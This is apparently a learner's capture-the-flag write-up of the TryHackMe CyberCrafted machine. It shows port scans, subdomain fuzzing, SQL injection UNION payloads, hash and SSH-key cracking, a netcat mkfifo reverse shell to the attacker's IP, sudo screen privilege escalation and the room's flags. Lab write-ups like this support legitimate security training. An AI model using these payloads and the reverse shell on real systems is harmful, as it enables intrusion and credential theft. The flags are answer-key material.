Quick port scan
```bash
nmap -p- --min-rate=5000 10.10.207.4
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-29 18:31 EEST
Nmap scan report for 10.10.207.4
Host is up (0.25s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
25565/tcp open  minecraft

Nmap done: 1 IP address (1 host up) scanned in 17.21 seconds
                                                                                                       
┌──(kali㉿kali)-[~]
└─$ nmap -p 22,80,25565 -sC -sV 10.10.207.4                
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-29 18:31 EEST
Nmap scan report for 10.10.207.4
Host is up (0.30s latency).

PORT      STATE SERVICE   VERSION
22/tcp    open  ssh       OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37:36:ce:b9:ac:72:8a:d7:a6:b7:8e:45:d0:ce:3c:00 (RSA)
|   256 e9:e7:33:8a:77:28:2c:d4:8c:6d:8a:2c:e7:88:95:30 (ECDSA)
|_  256 76:a2:b1:cf:1b:3d:ce:6c:60:f5:63:24:3e:ef:70:d8 (ED25519)
80/tcp    open  http      Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Did not follow redirect to http://cybercrafted.thm/
25565/tcp open  minecraft Minecraft 1.7.2 (Protocol: 127, Message: ck00r lcCyberCraftedr ck00rrck00r e-TryHackMe-r  ck00r, Users: 0/1)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.01 seconds
```

There are 3 ports open. SSH, website and the most important one. Minecraft server.

```bash
wfuzz -u http://cybercrafted.thm -H "HOST: FUZZ.cybercrafted.thm" -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt --hc 302
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://cybercrafted.thm/
Total requests: 100000

=====================================================================
ID           Response   Lines    Word       Chars       Payload                               
=====================================================================

000000001:   200        34 L     71 W       832 Ch      "www - www"                           
000000037:   403        9 L      28 W       287 Ch      "store - store"                       
000000036:   200        30 L     64 W       937 Ch      "admin - admin"
```

I did some subdomain enumerating. 


```bash
gobuster dir -w /usr/share/wordlists/dirb/big.txt  -u http://www.cybercrafted.thm -t 150 -x html,php 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://www.cybercrafted.thm
[+] Method:                  GET
[+] Threads:                 150
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              html,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd.html       (Status: 403) [Size: 285]
/.htaccess.html       (Status: 403) [Size: 285]
/.htpasswd.php        (Status: 403) [Size: 285]
/.htaccess.php        (Status: 403) [Size: 285]
/.htaccess            (Status: 403) [Size: 285]
/.htpasswd            (Status: 403) [Size: 285]
/assets               (Status: 301) [Size: 329] [--> http://www.cybercrafted.thm/assets/]
/index.html           (Status: 200) [Size: 832]
/secret               (Status: 301) [Size: 329] [--> http://www.cybercrafted.thm/secret/]
/server-status        (Status: 403) [Size: 285]
```


The pick pack-2 has an interesting comment on it 

```bash
exiftool pack-2.png 
ExifTool Version Number         : 13.25
File Name                       : pack-2.png
Directory                       : .
File Size                       : 27 kB
File Modification Date/Time     : 2025:08:29 18:53:53+03:00
File Access Date/Time           : 2025:08:29 18:57:42+03:00
File Inode Change Date/Time     : 2025:08:29 18:53:53+03:00
File Permissions                : -rw-rw-r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 128
Image Height                    : 128
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
SRGB Rendering                  : Perceptual
Gamma                           : 2.2
Pixels Per Unit X               : 3779
Pixels Per Unit Y               : 3779
Pixel Units                     : meters
Software                        : Paint.NET v3.5.5
Comment                         : ZLUOMQG6ZRAMFXGG2LFNZ2CA2LNMFTWK4ZAPFXXK
Image Size                      : 128x128
Megapixels                      : 0.016
```


```bash
gobuster dir -w /usr/share/wordlists/dirb/big.txt  -u http://store.cybercrafted.thm/ -t 150 -x html,php 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://store.cybercrafted.thm/
[+] Method:                  GET
[+] Threads:                 150
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              html,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 287]
/.htpasswd.html       (Status: 403) [Size: 287]
/.htpasswd            (Status: 403) [Size: 287]
/.htaccess.html       (Status: 403) [Size: 287]
/.htaccess.php        (Status: 403) [Size: 287]
/.htpasswd.php        (Status: 403) [Size: 287]
/assets               (Status: 301) [Size: 333] [--> http://store.cybercrafted.thm/assets/]
Progress: 16527 / 61407 (26.91%)[ERROR] error on word brenda: timeout occurred during the request
/index.html           (Status: 403) [Size: 287]
/search.php           (Status: 200) [Size: 838]
/server-status        (Status: 403) [Size: 287]
Progress: 61407 / 61407 (100.00%)
```

Ok so we know that search.php is exploitable. Im thinking that there is an sql injection since it seems like a database of minecraft "items"

We can use 
```bash
' UNION SELECT NULL,NULL,NULL,table_name FROM information_schema.tables-- -
``` 
To see all the names of data we can extract from the db

```bash
' UNION SELECT NULL,NULL,user,hash FROM admin-- -
```

For that part i had to lookup writeups since Im clearly not good enough at sqli injection, THe writeup linked a portswigger sqli course so im going to try that out to advance in that specific skill



```bash
' UNION SELECT NULL,NULL,user,hash FROM admin-- -
```

For that part i had to lookup writeups since Im clearly not good enough at sqli injection, THe writeup linked a portswigger sqli course so im going to try that out to advance in that specific skill

But now we have the hashes of admins
```bash
 	xXUltimateCreeperXx 	88b949dd5cdfbecb9f2ecbbfa24e5974234e7c01
	web_flag 	THM{bbe315906038c3a62d9b195001f75008}
```

We can crack it easily with hashcat
```bash
hashcat -m 100 -a 0 hash /usr/share/wordlists/rockyou.txt
```

88b949dd5cdfbecb9f2ecbbfa24e5974234e7c01:diamond123456789 


Now we just go backto admin.cybercrafted.thm and log in

Here we are able to run system commands. We can probably use it to get a reverse shell.

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.25.159 4444 >/tmp/f

nc -lvnp 4444                          
listening on [any] 4444 ...
connect to [10.6.25.159] from (UNKNOWN) [10.10.207.4] 45306
/bin/sh: 0: can't access tty; job control turned off
$ id 
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

beautiful

I found an ssh private key so we can use it to get a better shell.

It had a passphrase which i bruteforced.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt joni
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
creepin2006      (id_rsa)     
1g 0:00:00:00 DONE (2025-08-29 19:34) 2.631g/s 4989Kp/s 4989Kc/s 4989KC/s creepygoblin..creek93
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                                                                                                       
┌──(kali㉿kali)-[~]
└─$ ssh xxultimatecreeperxx@10.10.207.4 -i id_rsa        
Enter passphrase for key 'id_rsa': 
xxultimatecreeperxx@cybercrafted:~$ 
```

```bash
Some interesting things i found from the linpeas scan

═╣ MySQL connection using root/NOPASS ................. Yes                                            
User    Host    authentication_string
root    localhost
mysql.session   localhost       *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
mysql.sys       localhost       *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
debian-sys-maint        localhost       *A73B2A5E6692EE82361407AC83BFB67EAA02D31C
```
Ok so we were able to login in to mysql without password.

I didn't find anything of use from the sql

I saw that we are in a minecraft group
```bash
xxultimatecreeperxx@cybercrafted:/$ find / -type f -group minecraft 2>/dev/null
/opt/minecraft/note.txt
/opt/minecraft/minecraft_server_flag.txt
/opt/minecraft/cybercrafted/help.yml
/opt/minecraft/cybercrafted/commands.yml
/opt/minecraft/cybercrafted/world/level.dat_mcr
/opt/minecraft/cybercrafted/world/session.lock
/opt/minecraft/cybercrafted/world/DIM-1/data/villages.dat
/opt/minecraft/cybercrafted/world/DIM-1/forcedchunks.dat
/opt/minecraft/cybercrafted/world/playerdata/77f6b2f8-e83c-458d-9795-6487671ad59f.dat
/opt/minecraft/cybercrafted/world/DIM1/data/villages.dat
/opt/minecraft/cybercrafted/world/DIM1/forcedchunks.dat
/opt/minecraft/cybercrafted/world/data/villages_nether.dat
/opt/minecraft/cybercrafted/world/data/villages.dat
/opt/minecraft/cybercrafted/world/data/villages_end.dat
/opt/minecraft/cybercrafted/world/data/Fortress.dat
/opt/minecraft/cybercrafted/world/forcedchunks.dat
/opt/minecraft/cybercrafted/world/uid.dat
/opt/minecraft/cybercrafted/world/stats/_madrins.json
/opt/minecraft/cybercrafted/world/stats/hank20000.json
/opt/minecraft/cybercrafted/world/stats/77f6b2f8-e83c-458d-9795-6487671ad59f.json
/opt/minecraft/cybercrafted/world/players/hank20000.dat
/opt/minecraft/cybercrafted/world/players/_madrins.dat
/opt/minecraft/cybercrafted/world/region/r.-2.-3.mca
/opt/minecraft/cybercrafted/world/region/r.-1.-2.mca
/opt/minecraft/cybercrafted/world/region/r.-1.0.mca
/opt/minecraft/cybercrafted/world/region/r.-2.-1.mca
/opt/minecraft/cybercrafted/world/region/r.0.0.mca
/opt/minecraft/cybercrafted/world/region/r.-3.0.mca
/opt/minecraft/cybercrafted/world/region/r.-1.-1.mca
/opt/minecraft/cybercrafted/world/region/r.-2.0.mca
/opt/minecraft/cybercrafted/world/region/r.-3.-2.mca
/opt/minecraft/cybercrafted/world/region/r.-3.-3.mca
/opt/minecraft/cybercrafted/world/region/r.-3.-1.mca
/opt/minecraft/cybercrafted/world/region/r.-2.-2.mca
/opt/minecraft/cybercrafted/world/region/r.0.-1.mca
/opt/minecraft/cybercrafted/permissions.yml
/opt/minecraft/cybercrafted/server-icon.png
/opt/minecraft/cybercrafted/world_the_end/session.lock
/opt/minecraft/cybercrafted/world_the_end/DIM1/region/r.-1.0.mca
/opt/minecraft/cybercrafted/world_the_end/DIM1/region/r.0.0.mca
/opt/minecraft/cybercrafted/world_the_end/DIM1/region/r.-1.-1.mca
/opt/minecraft/cybercrafted/world_the_end/DIM1/region/r.0.-1.mca
/opt/minecraft/cybercrafted/world_the_end/uid.dat
/opt/minecraft/cybercrafted/white-list.txt
/opt/minecraft/cybercrafted/craftbukkit-1.7.2-server.jar
/opt/minecraft/cybercrafted/world_nether/session.lock
/opt/minecraft/cybercrafted/world_nether/level.dat_old
/opt/minecraft/cybercrafted/world_nether/DIM-1/region/r.-1.0.mca
/opt/minecraft/cybercrafted/world_nether/DIM-1/region/r.0.0.mca
/opt/minecraft/cybercrafted/world_nether/DIM-1/region/r.-1.-1.mca
/opt/minecraft/cybercrafted/world_nether/DIM-1/region/r.0.-1.mca
/opt/minecraft/cybercrafted/world_nether/level.dat
/opt/minecraft/cybercrafted/world_nether/uid.dat
/opt/minecraft/cybercrafted/plugins/LoginSystem_v.2.4.jar
/opt/minecraft/cybercrafted/plugins/LoginSystem/settings.yml
/opt/minecraft/cybercrafted/plugins/LoginSystem/passwords.yml
/opt/minecraft/cybercrafted/plugins/LoginSystem/log.txt
/opt/minecraft/cybercrafted/plugins/LoginSystem/language.yml
/opt/minecraft/cybercrafted/logs/2021-06-28-2.log.gz
/opt/minecraft/cybercrafted/logs/2021-06-27-2.log.gz
/opt/minecraft/cybercrafted/logs/2021-09-12-3.log.gz
/opt/minecraft/cybercrafted/logs/2021-09-12-5.log.gz
/opt/minecraft/cybercrafted/logs/2021-06-27-3.log.gz
/opt/minecraft/cybercrafted/logs/2021-06-27-1.log.gz
/opt/minecraft/cybercrafted/logs/2021-09-12-4.log.gz
/opt/minecraft/cybercrafted/logs/2021-09-12-2.log.gz
/opt/minecraft/cybercrafted/logs/2021-06-28-1.log.gz
/opt/minecraft/cybercrafted/logs/2021-09-12-1.log.gz
/opt/minecraft/cybercrafted/server.properties
/opt/minecraft/cybercrafted/ops.txt
/opt/minecraft/cybercrafted/bukkit.yml
/opt/minecraft/cybercrafted/banned-ips.txt
/opt/minecraft/cybercrafted/banned-players.txt
```

Here we found the minecraft server flag and a note.txt

```bash
xxultimatecreeperxx@cybercrafted:/opt/minecraft$ cat note.txt 
Just implemented a new plugin within the server so now non-premium Minecraft accounts can game too! :)
- cybercrafted

P.S
Will remove the whitelist soon.
```

We found the plugin and log.txt which had the password of the another account we werent able to log into

```bash
[2021/06/27 11:58:46] cybercrafted logged in. PW: JavaEdition>Bedrock
```

```bash
cybercrafted@cybercrafted:/tmp$ cat ~/user.txt
THM{b4aa20aaf08f174473ab0325b24a45ca}
```


Some interesting things i found from the scan
```bash

* *     1 * *   cybercrafted tar -zcf /opt/minecraft/WorldBackup/world.tgz /opt/minecraft/cybercrafted/world/*

Matching Defaults entries for cybercrafted on cybercrafted:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User cybercrafted may run the following commands on cybercrafted:
    (root) /usr/bin/screen -r cybercrafted§
```

https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-screen-privilege-escalation

So we can use the screen to privESC

That was one of the most annoying privESCs ever but i managed to do it. We were able to run it as root and then when we detached the screen we were still in root but we were not restricted at all with those minecraft commands so we can use it to read the root.txt

```bash
# whoami
root
# cat /root/root.txt
THM{8bb1eda065ceefb5795a245568350a70}
```

